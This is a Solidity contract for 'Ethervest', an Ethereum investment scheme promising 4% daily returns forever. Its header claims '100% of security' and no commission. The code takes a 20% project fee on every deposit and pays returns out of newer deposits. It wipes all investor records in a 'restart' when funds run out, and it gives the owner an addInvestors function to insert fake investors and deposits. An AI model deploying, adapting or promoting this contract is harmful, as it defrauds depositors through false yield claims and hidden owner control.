1 pragma solidity ^0.4.24;
2 
3 /**
4  *
5  * Ethervest Investment Contract
6  *  - GAIN 4% DAILY AND FOREVER (every 5900 blocks)
7  *  – MIN INVESTMENT 0.01 ETH
8  *  – 100% OF SECURITY
9  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
10  *
11  *
12  * RECOMMENDED GAS LIMIT: 250000
13  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
14  *
15  *
16  */
17 
18 contract Ethervest {
19     address public owner;
20     address public adminAddr;
21     uint constant public MASS_TRANSACTION_LIMIT = 150;
22     uint constant public MINIMUM_INVEST = 10000000000000000 wei;
23     uint constant public INTEREST = 4;
24     uint public depositAmount;
25     uint public round;
26     uint public lastPaymentDate;
27     EthervestKiller public ethervestKiller;
28     address[] public addresses;
29     mapping(address => Investor) public investors;
30     bool public pause;
31 
32     struct Investor
33     {
34         uint id;
35         uint deposit;
36         uint deposits;
37         uint date;
38         address referrer;
39     }
40 
41     struct EthervestKiller
42     {
43         address addr;
44         uint deposit;
45     }
46 
47     event Invest(address addr, uint amount, address referrer);
48     event Payout(address addr, uint amount, string eventType, address from);
49     event NextRoundStarted(uint round, uint date, uint deposit);
50     event EthervestKillerChanged(address addr, uint deposit);
51 
52     modifier onlyOwner {if (msg.sender == owner) _;}
53 
54     constructor() public {
55         owner = msg.sender;
56         adminAddr = msg.sender;
57         addresses.length = 1;
58         round = 1;
59     }
60 
61     function transferOwnership(address addr) onlyOwner public {
62         owner = addr;
63     }
64 
65     function addInvestors(address[] _addr, uint[] _deposit, uint[] _date, address[] _referrer) onlyOwner public {
66         // add initiated investors
67         for (uint i = 0; i < _addr.length; i++) {
68             uint id = addresses.length;
69             if (investors[_addr[i]].deposit == 0) {
70                 addresses.push(_addr[i]);
71                 depositAmount += _deposit[i];
72             }
73 
74             investors[_addr[i]] = Investor(id, _deposit[i], 1, _date[i], _referrer[i]);
75             emit Invest(_addr[i], _deposit  [i], _referrer[i]);
76 
77             if (investors[_addr[i]].deposit > ethervestKiller.deposit) {
78                 ethervestKiller = EthervestKiller(_addr[i], investors[_addr[i]].deposit);
79             }
80         }
81         lastPaymentDate = now;
82     }
83 
84     function() payable public {
85         if (owner == msg.sender) {
86             return;
87         }
88 
89         if (0 == msg.value) {
90             payoutSelf();
91             return;
92         }
93 
94         require(false == pause, "Ethervest is restarting. Please wait.");
95         require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.01 ether");
96         Investor storage user = investors[msg.sender];
97 
98         if (user.id == 0) {
99             // ensure that payment not from hacker contract
100             msg.sender.transfer(0 wei);
101             addresses.push(msg.sender);
102             user.id = addresses.length;
103             user.date = now;
104 
105             // referrer
106             address referrer = bytesToAddress(msg.data);
107             if (investors[referrer].deposit > 0 && referrer != msg.sender) {
108                 user.referrer = referrer;
109             }
110         } else {
111             payoutSelf();
112         }
113 
114         // save investor
115         user.deposit += msg.value;
116         user.deposits += 1;
117 
118         emit Invest(msg.sender, msg.value, user.referrer);
119 
120         depositAmount += msg.value;
121         lastPaymentDate = now;
122 
123         adminAddr.transfer(msg.value / 5); // project fee
124         uint bonusAmount = (msg.value / 100) * INTEREST; // referrer commission for all deposits
125 
126         if (user.referrer > 0x0) {
127             if (user.referrer.send(bonusAmount)) {
128                 emit Payout(user.referrer, bonusAmount, "referral", msg.sender);
129             }
130 
131             if (user.deposits == 1) { // cashback only for the first deposit
132                 if (msg.sender.send(bonusAmount)) {
133                     emit Payout(msg.sender, bonusAmount, "cash-back", 0);
134                 }
135             }
136         } else if (ethervestKiller.addr > 0x0) {
137             if (ethervestKiller.addr.send(bonusAmount)) {
138                 emit Payout(ethervestKiller.addr, bonusAmount, "killer", msg.sender);
139             }
140         }
141 
142         if (user.deposit > ethervestKiller.deposit) {
143             ethervestKiller = EthervestKiller(msg.sender, user.deposit);
144             emit EthervestKillerChanged(msg.sender, user.deposit);
145         }
146     }
147 
148     function payout(uint offset) public
149     {
150         if (pause == true) {
151             doRestart();
152             return;
153         }
154 
155         uint txs;
156         uint amount;
157 
158         for (uint idx = addresses.length - offset - 1; idx >= 1 && txs < MASS_TRANSACTION_LIMIT; idx--) {
159             address addr = addresses[idx];
160             if (investors[addr].date + 20 hours > now) {
161                 continue;
162             }
163 
164             amount = getInvestorDividendsAmount(addr);
165             investors[addr].date = now;
166 
167             if (address(this).balance < amount) {
168                 pause = true;
169                 return;
170             }
171 
172             if (addr.send(amount)) {
173                 emit Payout(addr, amount, "bulk-payout", 0);
174             }
175 
176             txs++;
177         }
178     }
179 
180     function payoutSelf() private {
181         require(investors[msg.sender].id > 0, "Investor not found.");
182         uint amount = getInvestorDividendsAmount(msg.sender);
183 
184         investors[msg.sender].date = now;
185         if (address(this).balance < amount) {
186             pause = true;
187             return;
188         }
189 
190         msg.sender.transfer(amount);
191         emit Payout(msg.sender, amount, "self-payout", 0);
192     }
193 
194     function doRestart() private {
195         uint txs;
196         address addr;
197 
198         for (uint i = addresses.length - 1; i > 0; i--) {
199             addr = addresses[i];
200             addresses.length -= 1;
201             delete investors[addr];
202             if (txs++ == MASS_TRANSACTION_LIMIT) {
203                 return;
204             }
205         }
206 
207         emit NextRoundStarted(round, now, depositAmount);
208         pause = false;
209         round += 1;
210         depositAmount = 0;
211         lastPaymentDate = now;
212 
213         delete ethervestKiller;
214     }
215 
216     function getInvestorCount() public view returns (uint) {
217         return addresses.length - 1;
218     }
219 
220     function getInvestorDividendsAmount(address addr) public view returns (uint) {
221         return investors[addr].deposit / 100 * INTEREST * (now - investors[addr].date) / 1 days;
222     }
223 
224     function bytesToAddress(bytes bys) private pure returns (address addr) {
225         assembly {
226             addr := mload(add(bys, 20))
227         }
228     }
229 }